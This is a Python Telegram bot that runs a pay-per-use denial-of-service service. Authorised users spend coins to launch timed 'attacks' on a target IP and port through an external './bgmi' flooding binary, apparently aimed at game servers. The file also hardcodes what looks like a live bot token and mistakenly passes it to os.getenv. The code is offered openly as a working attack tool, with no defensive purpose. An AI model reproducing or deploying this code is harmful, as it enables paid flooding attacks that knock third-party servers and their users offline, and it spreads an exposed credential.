import telebot
import os
import json
import subprocess

# Load token securely from an environment variable
TOKEN = os.getenv("7178304372:AAG-wAx1h3y6SH-XXfBrlUkXD_vMEJjbMjk")  
OWNER_ID = "1383324178"  # Replace with your owner ID
admin_ids = {"6060545769", "1871909759"}  # List of Admins

USER_FILE = "users.txt"
COINS_FILE = "coins.json"
COIN_RATE = 10  # 1 sec = 10 coins
MAX_ATTACK_TIME = 300  # Max attack time is 5 minutes (300 sec)

bot = telebot.TeleBot(TOKEN)

# Load authorized users
def load_users():
    if os.path.exists(USER_FILE):
        with open(USER_FILE, "r") as file:
            return set(file.read().splitlines())
    return set()

allowed_users = load_users()

# Save authorized users
def save_users():
    with open(USER_FILE, "w") as file:
        file.write("\n".join(allowed_users))

# Load user coins
def load_coins():
    if os.path.exists(COINS_FILE):
        with open(COINS_FILE, "r") as file:
            return json.load(file)
    return {}

user_coins = load_coins()

# Save user coins
def save_coins():
    with open(COINS_FILE, "w") as file:
        json.dump(user_coins, file, indent=4)

# Welcome Message on /start
@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, f"👋 Welcome {message.chat.first_name}! Use /help to see available commands.")

# Grant user access
@bot.message_handler(commands=['access'])
def grant_access(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids or user_id == OWNER_ID:
        command = message.text.split()
        if len(command) > 1:
            new_user = command[1]
            if new_user not in allowed_users:
                allowed_users.add(new_user)
                save_users()
                bot.reply_to(message, f"✅ User {new_user} has been granted access.")
            else:
                bot.reply_to(message, "❌ User already has access.")
        else:
            bot.reply_to(message, "Usage: /access <user_id>")
    else:
        bot.reply_to(message, "🚫 Only Admins can use this command.")

# Revoke user access
@bot.message_handler(commands=['deaccess'])
def revoke_access(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids or user_id == OWNER_ID:
        command = message.text.split()
        if len(command) > 1:
            target_user = command[1]
            if target_user in allowed_users:
                allowed_users.remove(target_user)
                save_users()
                bot.reply_to(message, f"✅ User {target_user} has been removed from the access list.")
            else:
                bot.reply_to(message, "❌ User is not in the access list.")
        else:
            bot.reply_to(message, "Usage: /deaccess <user_id>")
    else:
        bot.reply_to(message, "🚫 Only Admins can use this command.")

# /bgmi Attack Command with Coin Deduction & Time Limit
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_users:
        command = message.text.split()
        if len(command) == 4:
            target = command[1]
            port = int(command[2])
            time = int(command[3])  # Time in seconds

            if time > MAX_ATTACK_TIME:
                bot.reply_to(message, f"⏳ Max attack time is {MAX_ATTACK_TIME} seconds!")
                return

            required_coins = time * COIN_RATE  # Calculate required coins
            balance = user_coins.get(user_id, 0)

            if balance < required_coins:
                bot.reply_to(message, f"❌ Not enough coins! You need {required_coins} coins but only have {balance}.")
                return
            
            # Deduct coins
            user_coins[user_id] -= required_coins
            save_coins()

            # Execute the external ./bgmi script
            try:
                subprocess.run(["./bgmi", target, str(port), str(time)], check=True)
                bot.reply_to(message, f"🚀 Attack started on {target} for {time} seconds! 🔥\n💰 {required_coins} coins deducted.")
            except Exception as e:
                bot.reply_to(message, f"⚠️ Error executing attack: {str(e)}")
        else:
            bot.reply_to(message, "✅ Usage: /bgmi <target> <port> <time>")
    else:
        bot.reply_to(message, "🚫 You are not authorized to use this command.")

# Start Bot
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(f"Error: {e}")
